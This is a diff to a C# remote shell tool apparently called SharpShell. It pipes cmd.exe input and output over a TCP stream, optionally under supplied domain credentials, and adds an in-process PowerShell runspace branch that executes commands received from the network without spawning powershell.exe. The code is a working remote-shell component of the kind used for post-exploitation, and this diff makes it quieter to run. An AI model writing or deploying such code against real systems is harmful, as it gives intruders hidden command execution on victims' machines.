@@ -7,6 +7,8 @@ using System.Linq;
 using System.Threading.Tasks;
 using System.Collections.Generic;
 using System.Management;
+using System.Management.Automation.Runspaces;
+using System.Management.Automation;
 
 namespace SharpShell
 {
@@ -26,90 +28,148 @@ namespace SharpShell
             {
                 using (var stream = client.GetStream())
                 {
-                    using (var p = new Process())
+                    if (!isPS)
                     {
-                        var run = true;
-                        p.StartInfo.FileName = isPS ? "powershell.exe" : "cmd.exe";
-                        p.StartInfo.CreateNoWindow = true;
-                        p.StartInfo.UseShellExecute = false;
-                        p.StartInfo.RedirectStandardOutput = true;
-                        p.StartInfo.RedirectStandardInput = true;
-                        p.StartInfo.RedirectStandardError = true;
-                        p.Exited += new EventHandler((x, y) =>
+                        using (var p = new Process())
                         {
-                            run = false;
-                        });
-                        if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(user))
-                        {
-                            p.StartInfo.Domain = domain;
-                            p.StartInfo.UserName = user;
-                            var ssPwd = new System.Security.SecureString();
-                            pass.ToList().ForEach(x => ssPwd.AppendChar(x));
-                            pass = null; ;
-                            p.StartInfo.Password = ssPwd;
-                        }
-
-                        p.Start();
-
-                        var outTask = Task.Factory.StartNew(new Action(() =>
-                        {
-                            using (var streamWriter = new StreamWriter(stream))
+                            var run = true;
+                            p.StartInfo.FileName = "cmd.exe";
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.Exited += new EventHandler((x, y) =>
                             {
-                                streamWriter.AutoFlush = true;
-                                while (run)
-                                {
-                                    try
-                                    {
-                                        var c = char.ConvertFromUtf32(p.StandardOutput.Read());
-                                        streamWriter.Write(c);
-                                    }
-                                    catch { run = client.Connected; }
-                                }
+                                run = false;
+                            });
+                            if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(user))
+                            {
+                                p.StartInfo.Domain = domain;
+                                p.StartInfo.UserName = user;
+                                var ssPwd = new System.Security.SecureString();
+                                pass.ToList().ForEach(x => ssPwd.AppendChar(x));
+                                pass = null; ;
+                                p.StartInfo.Password = ssPwd;
                             }
-                        }), TaskCreationOptions.LongRunning);
-                        var inTask = Task.Factory.StartNew(new Action(() =>
-                        {
-                            using (var rdr = new StreamReader(stream))
+
+                            p.Start();
+
+                            var outTask = Task.Factory.StartNew(new Action(() =>
                             {
-                                rdr.BaseStream.ReadTimeout = 1000;
-                                while (run)
+                                using (var streamWriter = new StreamWriter(stream))
                                 {
-                                    try
+                                    streamWriter.AutoFlush = true;
+                                    while (run)
                                     {
-                                        var line = rdr.ReadLine();
-                                        p.StandardInput.WriteLine(line);
-                                        p.StandardInput.Flush();
-                                    }
-                                    catch {
-                                        run = client.Connected;
-                                        if (!run)
+                                        try
                                         {
-                                            GetChildProcesses(p).ToList().ForEach(c=> { c.Kill(); });
-                                            p.Kill();
-                                            return;
+                                            var c = char.ConvertFromUtf32(p.StandardOutput.Read());
+                                            streamWriter.Write(c);
+                                        }
+                                        catch { run = client.Connected; }
+                                    }
+                                }
+                            }), TaskCreationOptions.LongRunning);
+                            var inTask = Task.Factory.StartNew(new Action(() =>
+                            {
+                                using (var rdr = new StreamReader(stream))
+                                {
+                                    rdr.BaseStream.ReadTimeout = 1000;
+                                    while (run)
+                                    {
+                                        try
+                                        {
+                                            var line = rdr.ReadLine();
+                                            p.StandardInput.WriteLine(line);
+                                            p.StandardInput.Flush();
+                                        }
+                                        catch
+                                        {
+                                            run = client.Connected;
+                                            if (!run)
+                                            {
+                                                GetChildProcesses(p).ToList().ForEach(c => { c.Kill(); });
+                                                p.Kill();
+                                                return;
+                                            }
                                         }
                                     }
                                 }
-                            }
-                        }), TaskCreationOptions.LongRunning);
-                        var errTask = Task.Factory.StartNew(new Action(() =>
-                        {
-                            using (var streamWriter = new StreamWriter(stream))
+                            }), TaskCreationOptions.LongRunning);
+                            var errTask = Task.Factory.StartNew(new Action(() =>
                             {
-                                streamWriter.AutoFlush = true;
-                                while (run)
+                                using (var streamWriter = new StreamWriter(stream))
                                 {
-                                    try
+                                    streamWriter.AutoFlush = true;
+                                    while (run)
                                     {
-                                        var c = char.ConvertFromUtf32(p.StandardError.Read());
-                                        streamWriter.Write(c);
+                                        try
+                                        {
+                                            var c = char.ConvertFromUtf32(p.StandardError.Read());
+                                            streamWriter.Write(c);
+                                        }
+                                        catch { run = client.Connected; }
                                     }
-                                    catch { run = client.Connected; }
+                                }
+                            }), TaskCreationOptions.LongRunning);
+
+                            Task.WaitAll(outTask, inTask, errTask);
+                        }
+                    }
+                    else
+                    {
+                        using (var psi = PowerShell.Create())
+                        using (var streamWriter = new StreamWriter(stream))
+                        using (var rdr = new StreamReader(stream))
+                        {
+                            var prompt = "$>";
+                            rdr.BaseStream.ReadTimeout = 1000;
+                            var run = true;
+                            streamWriter.AutoFlush = true;
+                            streamWriter.Write($"{prompt}");
+
+                            while (run)
+                            {
+                                var line = "";
+                                try
+                                {
+                                    line = rdr.ReadLine();
+
+                                    if(line.ToLower() == "exit" || line.ToLower() == "quit")
+                                        return;
+
+                                    if (!string.IsNullOrEmpty(line))
+                                    {
+                                        psi.AddScript(line);
+
+                                        var output = psi.Invoke();
+
+                                        foreach (var o in output)
+                                        {
+                                            if (o != null)
+                                            {
+                                                streamWriter.WriteLine($"{o.BaseObject.ToString()}");
+                                            }
+                                        }
+
+                                        if (psi.Streams.Error.Count > 0)
+                                        {
+                                            psi.Streams.Error.ToList().ForEach(x => { streamWriter.WriteLine($"{x.ToString()}"); });
+                                        }
+
+                                    }
+
+                                    streamWriter.Write($"{prompt}");
+                                }
+                                catch(Exception ex)
+                                {
+                                    run = client.Connected;
+                                    if (!run)
+                                        return;
                                 }
                             }
-                        }), TaskCreationOptions.LongRunning);
-
-                        Task.WaitAll(outTask, inTask, errTask);
+                        }
                     }
                 }
             }
